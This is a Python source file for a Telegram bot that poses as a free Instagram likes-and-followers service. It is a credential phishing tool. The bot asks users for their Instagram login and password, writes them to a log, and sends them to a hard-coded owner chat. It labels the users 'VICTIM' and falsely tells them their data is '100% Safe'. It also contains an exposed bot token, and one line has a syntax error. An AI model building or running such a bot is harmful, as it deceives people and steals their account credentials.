
import telebot
from telebot import *
import time
import random
print("Bot Lanched Successfully!! By Telegram Owner")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '6099724261'
bot = telebot.TeleBot("6451890702:AAHDK-pWQa_T0gRKoueV3RkdZMeoP-zVAlc")
try:
	bot.send_message(ID, '𝖡𝗈𝗍 𝗂𝗌 𝗋𝗎𝗇𝗇𝗂𝗇𝗀 𝗇𝗈𝗐!') 
except:
	print("Maybe you didn't write /start in your bot! Without this action, the script will not work correctly!")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Got Victim Telegram
VICTIM ID: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''👋 𝖧𝖾𝗅𝗅𝗈! 👋
  Get Instagram Unlimited followers && Like! 
  𝖳𝗈 𝗀𝖾𝗍 𝗌𝗍𝖺𝗋𝗍𝖾𝖽, 𝗉𝗋𝖾𝗌𝗌 /get''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, 'Script author: 100% Secured Your Data') 

@bot.message_handler(commands=['get', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="𝖦𝖾𝗍 𝗅𝗂𝗄𝖾⚡️", callback_data="like")
	second_button = types.InlineKeyboardButton(text="𝖦𝖾𝗍 𝖥𝗈𝗅𝗅𝗈𝗐𝖾𝗋🔥", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "𝖲𝖾𝗅𝖾𝖼𝗍 𝖺𝗇 𝗂𝗍𝖾𝗆:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, '𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗈𝖿 𝗅𝗂𝗄𝖾𝗌 (𝗆𝖺𝗑 500)') 
		bot.register_next_step_handler(msg, qproc1)

	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, '𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗈𝖿 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 (𝗆𝖺𝗑 10000)'
		bot.register_next_step_handler(msg, qproc2)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, '𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝖺𝗆𝗈𝗎𝗇𝗍 𝖺𝗌 𝖺 𝗇𝗎𝗆𝖻𝖾𝗋! 𝖳𝗋𝗒 𝖺𝗀𝖺𝗂𝗇 𝖻𝗒 𝗍𝗒𝗉𝗂𝗇𝗀 /get !')#⏳
			return
		elif int(num) > 10000:
			bot.reply_to(message, '𝖳𝗁𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗈𝖿 𝗅𝗂𝗄𝖾𝗌 𝖼𝖺𝗇𝗇𝗈𝗍 𝖻𝖾 𝗆𝗈𝗋𝖾 𝗍𝗁𝖺𝗇 10000!')
			return
		else:
			bot.send_message(message.chat.id, f'𝖭𝗎𝗆𝖻𝖾𝗋 𝗈𝖿 𝗅𝗂𝗄𝖾𝗌: {num}')
			msg = bot.send_message(message.chat.id, '𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 Id username (phone number) secured🔒:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, '𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝖺𝗆𝗈𝗎𝗇𝗍 𝖺𝗌 𝖺 𝗇𝗎𝗆𝖻𝖾𝗋! 𝖳𝗋𝗒 𝖺𝗀𝖺𝗂𝗇 𝖻𝗒 𝗍𝗒𝗉𝗂𝗇𝗀 /get !')#⏳
			return
		elif int(num) > 10000:
			bot.reply_to(message, '𝖳𝗁𝖾 𝗇𝗎𝗆𝖻𝖾𝗋 𝗈𝖿 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 𝖼𝖺𝗇𝗇𝗈𝗍 𝖻𝖾 𝗆𝗈𝗋𝖾 𝗍𝗁𝖺𝗇 10000!')
			return
		else:
			bot.send_message(message.chat.id, f'𝖭𝗎𝗆𝖻𝖾𝗋 𝗈𝖿 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌: {num}')
			msg = bot.send_message(message.chat.id, '𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝖾𝗆𝖺𝗂𝗅 (𝗈𝗋 𝗉𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋) 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝖺𝖼𝖼𝗈𝗎𝗇𝗍:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def step1(message):
	get = f'''Data received ~ Telegram:
Received for Instagram
ID: {message.from_user.id}
Nick: @{message.from_user.username}
User: {message.text}
Name: {message.from_user.first_name}
BY Telegram Owner🌀

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'𝖸𝗈𝗎𝗋 𝗅𝗈𝗀𝗂𝗇: {message.text}')

	msg1 = bot.send_message(message.chat.id, '𝖤𝗇𝗍𝖾𝗋 𝗒𝗈𝗎𝗋 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽 secured🔒:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Data received ~ Telegram:
Received in bot: instagram
ID: {message.from_user.id}
Nick: @{message.from_user.username}
Pass: {usrpass}
Name: {message.from_user.first_name}
BY Telegram Owner

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'𝖸𝗈𝗎𝗋 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽: {usrpass}')
	time.sleep(1)
	bot.reply_to(message, f'𝖳𝗁𝖺𝗇𝗄 𝗒ou You For Telegram Owner Bot Your Data 100% Safe')


bot.polling()
		
